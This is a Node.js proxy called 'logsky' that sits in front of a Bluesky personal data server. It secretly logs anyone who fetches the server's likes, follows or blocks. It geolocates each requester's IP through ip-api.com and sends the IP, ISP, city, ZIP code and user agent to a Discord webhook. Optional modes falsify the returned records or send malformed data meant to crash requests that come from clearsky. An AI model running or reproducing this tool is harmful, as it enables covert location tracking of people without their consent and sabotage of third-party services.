'use strict';

// Imports
var http = require('http'),
  https = require('https'),
  connect = require('connect'),
  httpProxy = require('http-proxy'),
  transformerProxy = require('transformer-proxy');

// Globals
const utf8dec = new TextDecoder('UTF-8');

// Port to listen on (this is what you set in nginx)
const logsky_port = 5100;

// Upstream PDS settings
const upstream_host = "localhost";
const upstream_port = 3000;

// Can be multiple values for different behaviours:
// secret: act like a normal PDS, just log without anyone knowing ;)
// obfuscate: log and replace all entries in-place for privacy
// empty: return jack shit and log anyone daring to try
// crash: if possible cause crashes, otherwise use obfuscate
const mode = "secret";

// Discord webhook string (https://discord.com/api/webhooks/ [THIS STRING HERE])
const discord = "";

// Actual logging function, takes the input request, gets the fun info from it, dumps it into the webhook uwu
function log(what, req, res) {
  // Can get ratelimited if you are logging a very busy PDS, so this needs to be a try-catch
  try {
    var ip = req.headers['x-real-ip'] ?? req.headers['x-forwarded-for'];
    console.log(what + " - " + req.headers['origin'] + " - " + ip + " - " + req.headers['user-agent']);
    var ip_url = 'http://ip-api.com/json/' + ip + '?fields=200249';
    var ipgeo = http.get(ip_url, (ipgeores) => {
      var body = '';
      ipgeores.on('data', function (chunk) {
        body = body + chunk;
      }); 
      ipgeores.on('error', function(err) { console.log("IP-API error"); });
      ipgeores.on('end', function() {
        var info = JSON.parse(body);
        if(info.as.includes("AS201445")) {
          return;
        }
        var discord = https.request({
          hostname: "discord.com",
          port: 443,
          path: "/api/webhooks/" + discord,
          method: "POST",
          headers: {
            'Content-Type': 'application/json'
          },
          timeout: 3000
        }, (res) => {
    
        });
        var ip_string = ip;
        ip_string += info.mobile?" (Cellular ":" (";
        ip_string += info.proxy?"Proxy/VPN)":"Residential)";
        discord.write(JSON.stringify({
          embeds: [{
            color: 16166627,
            title: 'New capture!',
            fields: [
              {
                name: 'What?',
                value: what + ' via ' + req.headers['origin']??"direct call"
              },
              {
                name: 'IP',
                value: ip_string
              },
              {
                name: 'ISP',
                value: info.as + " (" + info.isp + " / " + info.org + ")"
              },
              {
                name: 'Geolocation',
                value: info.zip + " " + info.city + ", " + info.regionName + ", " + info.country
              },
              {
                name: 'User-Agent',
                value: req.headers['user-agent']
              }
            ]
          }]
        }));
        discord.end();
      });
    });
  } catch(e) {
    console.log("Error in Webhook / Logger");
  }
}

var likesTransformer = function (data, req, res) {
  log("Likes", req, res);
  
  if(mode == "secret") {
	return data;
  }
  if(mode == "empty") {
	return Buffer.from("{}", 'utf8');
  }
  
  var modified = utf8dec.decode(data).replace(/("subject":{"cid":".*?","uri":"at:\/\/did:plc:.*?\/app\.bsky\.feed\.post\/.*?"})/g,'"subject":{"cid":"bafyreihfwcxlub55y357r5ilsh7caud3rlecjwmvc5zcxrisuhq2cvkihe","uri":"at://did:plc:4vx4ptovbkbanaomd26emcx5/app.bsky.feed.post/3mchqazjc5s2f"}').replace(/(,"via":.*?})/g,'');
  return Buffer.from(modified, 'utf8');
};

var blockTransformer = function (data, req, res) {
  log("Blocks", req, res);
  
  if(mode == "secret") {
	return data;
  }
  if(mode == "empty") {
	return Buffer.from("{}", 'utf8');
  }
  if(req.headers['origin'].includes("clearsky") && mode == "crash") {
    var whoops = '{"records":[{"value":{"subject":false}}]}';
    return Buffer.from(whoops, 'utf8');
  }

  var modified = utf8dec.decode(data).replace(/("subject":"did:plc:.*?")/g,'"subject":"did:plc:4vx4ptovbkbanaomd26emcx5"');
  return Buffer.from(modified, 'utf8');
};

var listblockTransformer = function (data, req, res) {
  log("List-Blocks", req, res);
  
  if(mode == "secret") {
	return data;
  }
  if(mode == "empty") {
	return Buffer.from("{}", 'utf8');
  }
  
  var modified = utf8dec.decode(data).replace(/("subject":"at:\/\/did:plc:.*?\/app\.bsky\.graph\.list\/.*?")/g,'"subject":"at://did:plc:4vx4ptovbkbanaomd26emcx5/app.bsky.graph.list/3mchv5tgluc25"');
  return Buffer.from(modified, 'utf8');
};

var followTransformer = function (data, req, res) {
  log("Follows", req, res);
  
  if(mode == "secret") {
	return data;
  }
  if(mode == "empty") {
	return Buffer.from("{}", 'utf8');
  }
  
  var modified = utf8dec.decode(data).replace(/("subject":"did:plc:.*?")/g,'"subject":"did:plc:4vx4ptovbkbanaomd26emcx5"');
  return Buffer.from(modified, 'utf8');
};

var repoTransformer = function (data, req, res) {
  log("Repo", req, res);
  
  if(mode == "secret") {
	return data;
  }
  if(mode == "empty") {
	return Buffer.from("", 'utf8');
  }

  var likePattern = "7065726170702E62736B792E666565642E6C696B65";
  var followPattern = "7065756170702E62736B792E67726170682E666F6C6C6F77";
  var listblockPattern = "706578186170702E62736B792E67726170682E6C697374626C6F636B";
  var blockPattern = "7065746170702E62736B792E67726170682E626C6F636B";

  var likeBuffer = Buffer.from('7065726170702E62736B792E666565642E6C696B65677375626A656374A263636964783B6261667972656968667763786C75623535793335377235696C7368376361756433726C65636A776D7663357A63787269737568713263766B69686563757269784661743A2F2F6469643A706C633A3476783470746F76626B62616E616F6D643236656D6378352F6170702E62736B792E666565642E706F73742F336D636871617A6A63357332666963726561746564', 'hex');
  var followBuffer = Buffer.from('7065756170702E62736B792E67726170682E666F6C6C6F77677375626A65637478206469643A706C633A3476783470746F76626B62616E616F6D643236656D6378356963726561746564', 'hex');
  var listblockBuffer = Buffer.from('706578186170702E62736B792E67726170682E6C697374626C6F636B677375626A656374784761743A2F2F6469643A706C633A3476783470746F76626B62616E616F6D643236656D6378352F6170702E62736B792E67726170682E6C6973742F336D6368763574676C756332356963726561746564', 'hex');
  var blockBuffer = Buffer.from('7065746170702E62736B792E67726170682E626C6F636B677375626A65637478206469643A706C633A3476783470746F76626B62616E616F6D643236656D6378356963726561746564', 'hex');

  var hit = data.indexOf(blockPattern, 0, 'hex');
  var pos = 0;
  while(hit != -1) {
    blockBuffer.copy(data, hit, 0, blockBuffer.length);
    var pos = pos + blockBuffer.length;
    var hit = data.indexOf(blockPattern, pos, 'hex');
  }

  var hit = data.indexOf(listblockPattern, 0, 'hex');
  var pos = 0;
  while(hit != -1) {
    listblockBuffer.copy(data, hit, 0, listblockBuffer.length);
    var pos = pos + listblockBuffer.length;
    var hit = data.indexOf(listblockPattern, pos, 'hex');
  }

  var hit = data.indexOf(likePattern, 0, 'hex');
  var pos = 0;
  while(hit != -1) {
    likeBuffer.copy(data, hit, 0, likeBuffer.length);
    var pos = pos + likeBuffer.length;
    var hit = data.indexOf(likePattern, pos, 'hex');
  }

  var hit = data.indexOf(followPattern, 0, 'hex');
  var pos = 0;
  while(hit != -1) {
    followBuffer.copy(data, hit, 0, followBuffer.length);
    var pos = pos + followBuffer.length;
    var hit = data.indexOf(followPattern, pos, 'hex');
  }

  return data;
};

var recordTransformer = function (data, req, res) {
  log("Records", req, res);
  
  if(mode == "secret") {
	return data;
  }
  if(mode == "empty") {
	return Buffer.from("", 'utf8');
  }

  var likePattern = "7065726170702E62736B792E666565642E6C696B65";
  var followPattern = "7065756170702E62736B792E67726170682E666F6C6C6F77";
  var listblockPattern = "706578186170702E62736B792E67726170682E6C697374626C6F636B";
  var blockPattern = "7065746170702E62736B792E67726170682E626C6F636B";

  var likeBuffer = Buffer.from('7065726170702E62736B792E666565642E6C696B65677375626A656374A263636964783B6261667972656968667763786C75623535793335377235696C7368376361756433726C65636A776D7663357A63787269737568713263766B69686563757269784661743A2F2F6469643A706C633A3476783470746F76626B62616E616F6D643236656D6378352F6170702E62736B792E666565642E706F73742F336D636871617A6A63357332666963726561746564', 'hex');
  var followBuffer = Buffer.from('7065756170702E62736B792E67726170682E666F6C6C6F77677375626A65637478206469643A706C633A3476783470746F76626B62616E616F6D643236656D6378356963726561746564', 'hex');
  var listblockBuffer = Buffer.from('706578186170702E62736B792E67726170682E6C697374626C6F636B677375626A656374784761743A2F2F6469643A706C633A3476783470746F76626B62616E616F6D643236656D6378352F6170702E62736B792E67726170682E6C6973742F336D6368763574676C756332356963726561746564', 'hex');
  var blockBuffer = Buffer.from('7065746170702E62736B792E67726170682E626C6F636B677375626A65637478206469643A706C633A3476783470746F76626B62616E616F6D643236656D6378356963726561746564', 'hex');

  var hit = data.indexOf(blockPattern, 0, 'hex');
  var pos = 0;
  while(hit != -1) {
    blockBuffer.copy(data, hit, 0, blockBuffer.length);
    var pos = pos + blockBuffer.length;
    var hit = data.indexOf(blockPattern, pos, 'hex');
  }

  var hit = data.indexOf(listblockPattern, 0, 'hex');
  var pos = 0;
  while(hit != -1) {
    listblockBuffer.copy(data, hit, 0, listblockBuffer.length);
    var pos = pos + listblockBuffer.length;
    var hit = data.indexOf(listblockPattern, pos, 'hex');
  }

  var hit = data.indexOf(likePattern, 0, 'hex');
  var pos = 0;
  while(hit != -1) {
    likeBuffer.copy(data, hit, 0, likeBuffer.length);
    var pos = pos + likeBuffer.length;
    var hit = data.indexOf(likePattern, pos, 'hex');
  }

  var hit = data.indexOf(followPattern, 0, 'hex');
  var pos = 0;
  while(hit != -1) {
    followBuffer.copy(data, hit, 0, followBuffer.length);
    var pos = pos + followBuffer.length;
    var hit = data.indexOf(followPattern, pos, 'hex');
  }

  return data;
};

var app = connect();
var proxy = httpProxy.createProxyServer({target: 'http://' + upstream_host + ':' + upstream_port});

app.use(transformerProxy(recordTransformer, {match : /.*(\/com\.atproto\.sync\.getRecord\?).*/}));
app.use(transformerProxy(repoTransformer, {match : /.*(\/com\.atproto\.sync\.getRepo\?).*/}));
app.use(transformerProxy(likesTransformer, {match : /.*(collection=app\.bsky\.feed\.like).*/}));
app.use(transformerProxy(blockTransformer, {match : /.*(collection=app\.bsky\.graph\.block).*/}));
app.use(transformerProxy(listblockTransformer, {match : /.*(collection=app\.bsky\.graph\.listblock).*/}));
app.use(transformerProxy(followTransformer, {match : /.*(collection=app\.bsky\.graph\.follow).*/}));

http.createServer(app).listen(logsky_port);

console.log('Listening on port ' + logsky_port);
console.log('Forwarding to http://' + upstream_host + ':' + upstream_port);
